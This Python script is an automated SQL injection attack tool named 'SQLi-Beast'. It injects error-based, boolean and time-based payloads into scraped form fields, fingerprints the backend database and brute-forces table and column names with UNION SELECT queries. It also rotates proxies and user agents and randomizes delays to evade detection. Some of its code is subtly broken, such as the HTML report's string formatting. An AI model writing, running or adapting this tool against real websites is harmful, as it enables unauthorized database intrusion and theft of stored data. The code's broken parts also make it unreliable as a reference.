import requests
import time
import random
import csv
import os
import re
import argparse
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "SQLi-Beast/5.0"
]

db_errors = {
    "MySQL": [r"you have an error in your sql syntax", r"mysql", r"supplied argument is not a valid mysql"],
    "PostgreSQL": [r"pg_query", r"pg_exec", r"postgresql", r"syntax error at or near"],
    "MSSQL": [r"microsoft sql", r"unclosed quotation mark", r"incorrect syntax near"],
    "Oracle": [r"ora-\d+", r"oracle", r"quoted string not properly terminated"]
}

results_list = []

def detect_db_type(url, proxies=None):
    payloads = ["'", "1; --", "' OR '1'='1", "' AND SLEEP(5) --", "WAITFOR DELAY '0:0:5' --", "pg_sleep(5); --"]
    headers = {"User-Agent": random.choice(user_agents)}
    for payload in payloads:
        try:
            r = requests.get(url, params={"test": payload}, headers=headers, proxies=proxies, timeout=15)
            text = r.text.lower()
            for db, patterns in db_errors.items():
                if any(re.search(pat, text, re.IGNORECASE) for pat in patterns):
                    print(f"Detected database: {db}")
                    return db
            if "SLEEP(5)" in payload and r.elapsed.total_seconds() > 5:
                print("Detected database: MySQL (time-based)")
                return "MySQL"
            if "WAITFOR DELAY" in payload and r.elapsed.total_seconds() > 5:
                print("Detected database: MSSQL (time-based)")
                return "MSSQL"
            if "pg_sleep" in payload and r.elapsed.total_seconds() > 5:
                print("Detected database: PostgreSQL (time-based)")
                return "PostgreSQL"
        except Exception as e:
            print(f"Error detecting database: {e}")
    print("Database not detected.")
    return "Unknown"

def get_form_fields(url, proxies=None):
    try:
        r = requests.get(url, timeout=10, proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        if not forms:
            print("No forms found on page, using default fields.")
            return ["username", "password"]
        fields = []
        for form in forms:
            fields.extend(input.get('name') for input in form.find_all('input') if input.get('name'))
        return list(set(fields))
    except Exception as e:
        print(f"Error parsing form: {e}")
        return ["username", "password"]

def test_payload(method, payload, param, baseline_text, baseline_time, args):
    session = requests.Session()
    proxy = {"http": random.choice(args.proxies), "https": random.choice(args.proxies)} if args.proxies else None
    headers = {"User-Agent": random.choice(user_agents)}
    data = {param: payload, "password": "anything"}

    try:
        start = time.time()
        r = session.request(method, args.url,
                            params=data if method == "GET" else None,
                            data=data if method == "POST" else None,
                            headers=headers, cookies=args.cookies,
                            proxies=proxy, timeout=15)
        elapsed = time.time() - start
        content_diff = abs(len(r.text) - len(baseline_text)) / len(baseline_text)

        is_vulnerable = (
            elapsed > baseline_time + args.sleep_threshold or
            content_diff > args.content_diff_percent or
            any(re.search(pat, r.text, re.IGNORECASE) for pat in sum(db_errors.values(), [])) or
            r.status_code in [200, 302] and r.status_code != baseline_response.status_code
        )

        if is_vulnerable or args.log_all:
            print(f"{param}: {payload} [{method}] | {elapsed:.2f}s | Diff: {content_diff:.2%} | Status: {r.status_code} | Vuln: {is_vulnerable}")
            row = [datetime.now().isoformat(), param, payload, method, elapsed, len(r.text), r.status_code, is_vulnerable]
            results_list.append(row)
            with open(args.log, "a", newline="") as logf:
                writer = csv.writer(logf)
                writer.writerow(row)

    except Exception as e:
        print(f"Error for {param}: {payload} [{method}]: {e}")

def run_tests(method, args, extra_payloads=None):
    print(f"\nTesting {method} with {args.threads} threads...")
    fields = get_form_fields(args.url, args.proxies)
    targets = [args.field] if args.field else fields

    session = requests.Session()
    baseline_start = time.time()
    global baseline_response
    baseline_response = session.request(method, args.url, timeout=10, cookies=args.cookies, proxies=args.proxies)
    baseline_time = time.time() - baseline_start
    baseline_text = baseline_response.text

    payloads = extra_payloads if extra_payloads else args.payloads
    total_tests = len(targets) * len(payloads)
    print(f"Total tests: {total_tests}")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for i, (field, payload) in enumerate([(f, p) for f in targets for p in payloads], 1):
            executor.submit(test_payload, method, payload, field, baseline_text, baseline_time, args)
            print(f"\rProgress: {i}/{total_tests} ({i/total_tests:.1%})", end="")
            time.sleep(random.uniform(args.delay_min, args.delay_max))
    print("\nDone!")

def save_reports(args):
    if args.output_format in ["json", "all"]:
        json_path = args.log.replace(".csv", ".json")
        with open(json_path, "w") as jf:
            json.dump({
                "url": args.url,
                "db_type": getattr(args, "db_type", "Unknown"),
                "total_tests": len(results_list),
                "results": [dict(zip(["timestamp", "field", "payload", "method", "time", "length", "status", "vulnerable"], row)) for row in results_list]
            }, jf, indent=4)
        print(f"JSON report: {json_path}")

    if args.output_format in ["html", "all"]:
        html_path = args.log.replace(".csv", ".html")
        with open(html_path, "w") as hf:
            hf.write("""
            <html>
                <head>
                    <title>SQLi Beast Report</title>
                    <style>
                        table { border-collapse: collapse; width: 100%; font-family: Arial; }
                        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                        th { background-color: #f2f2f2; }
                        tr:nth-child(even) { background-color: #f9f9f9; }
                        tr.vuln { background-color: #ffcccc; }
                    </style>
                </head>
                <body>
                    <h2>SQLi Beast Report - {}</h2>
                    <table>
                        <tr><th>Timestamp</th><th>Field</th><th>Payload</th><th>Method</th><th>Time</th><th>Length</th><th>Status</th><th>Vulnerable</th></tr>
            """.format(args.url))
            for row in results_list:
                vuln_class = "vuln" if row[-1] else ""
                hf.write(f"<tr class='{vuln_class}'>" + "".join(f"<td>{c}</td>" for c in row) + "</tr>")
            hf.write("</table></body></html>")
        print(f"HTML report: {html_path}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQLi-Beast v5.0 - BOSS LEVEL",
                                    epilog="Example: python sqli_beast.py -u http://example.com/login.php -pfp proxies.txt --output-format all")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-pf", "--payload-file", default="payloads.txt", help="Payload file path")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-l", "--log", default=f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv", help="Log CSV file")
    parser.add_argument("-f", "--field", help="Scan only this field")
    parser.add_argument("-c", "--cookies", type=str, help="Cookies as k1=v1;k2=v2")
    parser.add_argument("-pfp", "--proxy-file", help="File with list of proxies")
    parser.add_argument("-tw", "--table-wordlist", help="Table name wordlist for brute-force")
    parser.add_argument("-cw", "--column-wordlist", help="Column name wordlist for brute-force")
    parser.add_argument("--db-detect", action="store_true", help="Try to detect DB type before tests")
    parser.add_argument("--output-format", choices=["csv", "json", "html", "all"], default="csv", help="Report format")
    parser.add_argument("--log-all", action="store_true", help="Log all requests")
    parser.add_argument("-st", "--sleep-threshold", type=float, default=4.0, help="Sleep threshold in seconds")
    parser.add_argument("-cd", "--content-diff-percent", type=float, default=0.1, help="Content diff threshold (fraction)")
    parser.add_argument("-dm", "--delay-min", type=float, default=0.1, help="Minimum delay between requests")
    parser.add_argument("-dx", "--delay-max", type=float, default=0.3, help="Maximum delay between requests")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()
    results_list.clear()

    if not os.path.exists(args.payload_file):
        print(f"Payload file '{args.payload_file}' does not exist!")
        exit(1)
    with open(args.payload_file) as f:
        args.payloads = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    if args.proxy_file and not os.path.exists(args.proxy_file):
        print(f"Proxy file '{args.proxy_file}' does not exist!")
        exit(1)
    args.proxies = []
    if args.proxy_file:
        with open(args.proxy_file) as pf:
            args.proxies = [line.strip() for line in pf if line.strip()]

    if args.cookies:
        args.cookies = dict(x.split("=") for x in args.cookies.split(";"))

    with open(args.log, "w", newline="") as logf:
        writer = csv.writer(logf)
        writer.writerow(["Timestamp", "Field", "Payload", "Method", "Time", "Length", "Status", "Vulnerable"])

    print(f"Target: {args.url}")
    if args.db_detect:
        args.db_type = detect_db_type(args.url, args.proxies)

    run_tests("GET", args)
    run_tests("POST", args)

    if args.table_wordlist:
        with open(args.table_wordlist) as tf:
            tables = [line.strip() for line in tf if line.strip()]
        print(f"Bruteforcing tables ({len(tables)})...")
        table_payloads = [f"' UNION SELECT 1 FROM {tbl} --" for tbl in tables]
        run_tests("GET", args, table_payloads)

    if args.column_wordlist:
        with open(args.column_wordlist) as cf:
            cols = [line.strip() for line in cf if line.strip()]
        print(f"Bruteforcing columns ({len(cols)})...")
        col_payloads = [f"' UNION SELECT {col}, null FROM information_schema.columns --" for col in cols]
        run_tests("GET", args, col_payloads)

    save_reports(args)
